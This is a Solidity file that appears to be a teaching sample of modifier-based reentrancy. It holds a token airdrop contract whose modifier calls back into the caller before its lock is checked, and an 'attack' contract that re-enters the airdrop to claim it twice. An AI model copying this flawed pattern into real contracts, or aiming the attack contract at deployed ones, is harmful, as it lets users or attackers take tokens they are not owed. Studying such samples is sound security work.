pragma solidity ^0.4.24;

contract ModifierEntrancy {
    mapping(address => uint) public tokenBalance;
    string constant name = "Nu Token";
    bool private locked;

    function airDrop() public hasNoBalance supportsToken {
        require(!locked);
        locked = true;
        tokenBalance[msg.sender] += 20;
        locked = false;
    }

    modifier supportsToken() {
        require(
            keccak256(abi.encodePacked("Nu Token")) ==
                Bank(msg.sender).supportsToken()
        );
        _;
    }

    modifier hasNoBalance() {
        require(tokenBalance[msg.sender] == 0);
        _;
    }
}

contract Bank {
    function supportsToken() external pure returns (bytes32) {
        return (keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack {
    bool hasBeenCalled;
    ModifierEntrancy private target;

    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            target.airDrop();
        }
        return (keccak256(abi.encodePacked("Nu Token")));
    }

    function setTarget(address _target) public {
        target = ModifierEntrancy(_target);
    }

    function callTarget() public {
        target.airDrop();
    }
}